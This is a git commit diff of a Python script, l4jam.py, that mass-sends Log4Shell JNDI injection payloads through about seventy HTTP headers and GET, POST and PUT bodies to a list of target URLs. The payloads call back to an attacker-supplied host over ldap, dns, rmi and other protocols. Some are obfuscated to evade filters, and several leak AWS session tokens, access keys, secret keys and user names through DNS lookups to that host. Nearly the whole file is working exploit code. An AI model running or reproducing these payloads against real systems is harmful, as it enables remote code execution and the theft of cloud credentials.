c7b8c3d72420841c80def9ff51e62135a3bc6d92
Ashish Kunwar <dorkerdevil280@gmail.com>
2021-12-14 20:32:57 +0530

    Update l4jam.py

--- l4jam.py
+++ l4jam.py
@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/python
 # -*- coding: utf-8 -*-
 
 import sys
@@ -13,10 +13,10 @@ disable_warnings()
 from requests_toolbelt.utils import dump
 import re
 
-#coded_by_DorkerDevil
+# coded_by_DorkerDevil
 
 target = sys.argv[1]
-ssrf = sys.argv[2] 
+ssrf = sys.argv[2]
 
 S = 10
 ran = ''.join(random.choices(string.ascii_lowercase + string.digits,
@@ -25,104 +25,133 @@ collab = str(ran) + '.' + ssrf
 
 list = [
     'Referer',
-'X-Api-Version',
-'Accept-Charset',
-'Accept-Datetime',
-'Accept-Encoding',
-'Accept-Language',
-'Cookie',
-'Forwarded',
-'Forwarded-For',
-'Forwarded-For-Ip',
-'Forwarded-Proto',
-'From',
-'TE',
-'True-Client-IP',
-'Upgrade',
-'User-Agent',
-'Via',
-'Warning',
-'X-Api-Version',
-'Max-Forwards',
-'Origin',
-'Pragma',
-'DNT',
-'Cache-Control',
-'X-Att-Deviceid',
-'X-ATT-DeviceId',
-'X-Correlation-ID',
-'X-Csrf-Token',
-'X-CSRFToken',
-'X-Do-Not-Track',
-'X-Foo',
-'X-Foo-Bar',
-'X-Forwarded',
-'X-Forwarded-By',
-'X-Forwarded-For',
-'X-Forwarded-For-Original',
-'X-Forwarded-Host',
-'X-Forwarded-Port',
-'X-Forwarded-Proto',
-'X-Forwarded-Protocol',
-'X-Forwarded-Scheme',
-'X-Forwarded-Server',
-'X-Forwarded-Ssl',
-'X-Forwarder-For',
-'X-Forward-For',
-'X-Forward-Proto',
-'X-Frame-Options',
-'X-From',
-'X-Geoip-Country',
-'X-Http-Destinationurl',
-'X-Http-Host-Override',
-'X-Http-Method',
-'X-Http-Method-Override',
-'X-HTTP-Method-Override',
-'X-Http-Path-Override',
-'X-Https',
-'X-Htx-Agent',
-'X-Hub-Signature',
-'X-If-Unmodified-Since',
-'X-Imbo-Test-Config',
-'X-Insight',
-'X-Ip',
-'X-Ip-Trail',
-'X-ProxyUser-Ip',
-'X-Requested-With',
-'X-Request-ID',
-'X-UIDH',
-'X-Wap-Profile',
-'X-XSRF-TOKEN',
+    'X-Api-Version',
+    'Accept-Charset',
+    'Accept-Datetime',
+    'Accept-Encoding',
+    'Accept-Language',
+    'Cookie',
+    'Forwarded',
+    'Forwarded-For',
+    'Forwarded-For-Ip',
+    'Forwarded-Proto',
+    'From',
+    'TE',
+    'True-Client-IP',
+    'Upgrade',
+    'User-Agent',
+    'Via',
+    'Warning',
+    'X-Api-Version',
+    'Max-Forwards',
+    'Origin',
+    'Pragma',
+    'DNT',
+    'Cache-Control',
+    'X-Att-Deviceid',
+    'X-ATT-DeviceId',
+    'X-Correlation-ID',
+    'X-Csrf-Token',
+    'X-CSRFToken',
+    'X-Do-Not-Track',
+    'X-Foo',
+    'X-Foo-Bar',
+    'X-Forwarded',
+    'X-Forwarded-By',
+    'X-Forwarded-For',
+    'X-Forwarded-For-Original',
+    'X-Forwarded-Host',
+    'X-Forwarded-Port',
+    'X-Forwarded-Proto',
+    'X-Forwarded-Protocol',
+    'X-Forwarded-Scheme',
+    'X-Forwarded-Server',
+    'X-Forwarded-Ssl',
+    'X-Forwarder-For',
+    'X-Forward-For',
+    'X-Forward-Proto',
+    'X-Frame-Options',
+    'X-From',
+    'X-Geoip-Country',
+    'X-Http-Destinationurl',
+    'X-Http-Host-Override',
+    'X-Http-Method',
+    'X-Http-Method-Override',
+    'X-HTTP-Method-Override',
+    'X-Http-Path-Override',
+    'X-Https',
+    'X-Htx-Agent',
+    'X-Hub-Signature',
+    'X-If-Unmodified-Since',
+    'X-Imbo-Test-Config',
+    'X-Insight',
+    'X-Ip',
+    'X-Ip-Trail',
+    'X-ProxyUser-Ip',
+    'X-Requested-With',
+    'X-Request-ID',
+    'X-UIDH',
+    'X-Wap-Profile',
+    'X-XSRF-TOKEN',
     ]
-paload = \
-    ['${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//:'
-      + collab + '/a}', '${jndi:dns://' + collab
-     + '/ext}${jndi:${lower:l}${lower:d}a${lower:p}://' + collab + '/z',
-     '${jndi:ldap://${env:user}.' + collab + '/a}', '${jndi:dns://'
-     + collab
-     + '/.${env:AWS_SESSION_TOKEN }.${env:AWS_ACCESS_KEY_ID}.${env:AWS_SECRET_ACCESS_KEY}}'
-     ,
-     '${jndi:dns://${env:AWS_SESSION_TOKEN }.${env:AWS_ACCESS_KEY_ID}.${env:AWS_SECRET_ACCESS_KEY}.'
-      + collab + '/a}', '${jndi:ldap://${sys:user.name}.'+collab+'/z}', '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://'+collab+'/z}']
+proto = [
+    'ldap',
+    'dns',
+    'rmi',
+    'nis',
+    'nds',
+    'corba',
+    'iiop',
+    ]
+for protos in proto:
+    paload = [
+        '${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//:'
+             + collab + '/a}',
+        '${jndi:' + protos + '://' + collab
+            + '/ext}${jndi:${lower:l}${lower:d}a${lower:p}://' + collab
+            + '/z',
+        '${jndi:' + protos + '://${env:user}.' + collab + '/a}',
+        '${jndi:' + protos + '://' + collab
+            + '/.${env:AWS_SESSION_TOKEN }.${env:AWS_ACCESS_KEY_ID}.${env:AWS_SECRET_ACCESS_KEY}}'
+            ,
+        '${jndi:dns://${env:AWS_SESSION_TOKEN }.${env:AWS_ACCESS_KEY_ID}.${env:AWS_SECRET_ACCESS_KEY}.'
+             + collab + '/a}',
+        '${jndi:' + protos + '://${sys:user.name}.' + collab + '/z}',
+        '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://'
+             + collab + '/z}',
+        ]
 
-with open(target, "r", encoding='utf-8') as fd:
+with open(target, 'r', encoding='utf-8') as fd:
     for i in fd.readlines():
         url = i.strip()
-        if url == "" or url.startswith("#"):
+        if url == '' or url.startswith('#'):
             continue
 
 for headerz in list:
     for pay in paload:
         target_headerz = {headerz: pay}
-        r = requests.get(url+"/?something="+str(ran), headers=target_headerz, timeout=2,
+        r = requests.get(url + '/?something=' + str(ran),
+                         headers=target_headerz, timeout=2,
                          verify=False, allow_redirects=True)
         data = dump.dump_all(r)
-        print(data.decode('utf-8'))
-        rpost = requests.post(url+"/?something="+str(ran), data = pay, headers=target_headerz, timeout=3,
-                         verify=False, allow_redirects=True)
+        print (data.decode('utf-8'))
+        rpost = requests.post(
+            url + '/?something=' + str(ran),
+            data=pay,
+            headers=target_headerz,
+            timeout=3,
+            verify=False,
+            allow_redirects=True,
+            )
         data = dump.dump_all(rpost)
-        print(data.decode('utf-8'))
-        rput = requests.put(url+"/lmao.txt", data = pay, headers=target_headerz, timeout=3,
-                         verify=False, allow_redirects=True)
+        print (data.decode('utf-8'))
+        rput = requests.put(
+            url + '/lmao.txt',
+            data=pay,
+            headers=target_headerz,
+            timeout=3,
+            verify=False,
+            allow_redirects=True,
+            )
         data = dump.dump_all(rput)
-        print(data.decode('utf-8'))
+        print (data.decode('utf-8'))
